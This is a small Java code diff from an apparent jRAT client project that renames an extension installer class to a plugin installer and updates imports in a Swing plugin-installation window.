@@ -34,10 +34,10 @@ import javax.swing.table.DefaultTableModel;
 
 import su.jrat.client.Constants;
 import su.jrat.client.ErrorDialog;
-import su.jrat.client.extensions.ExtensionInstaller;
-import su.jrat.client.extensions.OnlinePlugin;
 import su.jrat.client.listeners.ExtensionInstallerListener;
 import su.jrat.client.net.WebRequest;
+import su.jrat.client.plugins.OnlinePlugin;
+import su.jrat.client.plugins.PluginInstaller;
 import su.jrat.client.ui.dialogs.DialogImage;
 
 
@@ -201,7 +201,7 @@ public class FrameInstallPlugins extends JFrame {
 			return;
 		}
 
-		final ExtensionInstaller installer = new ExtensionInstaller(plugin, new ExtensionInstallerListener() {
+		final PluginInstaller installer = new PluginInstaller(plugin, new ExtensionInstallerListener() {
 			@Override
 			public void status(Color color, String message, int current, int total) {
 				lblStatus.setForeground(color);
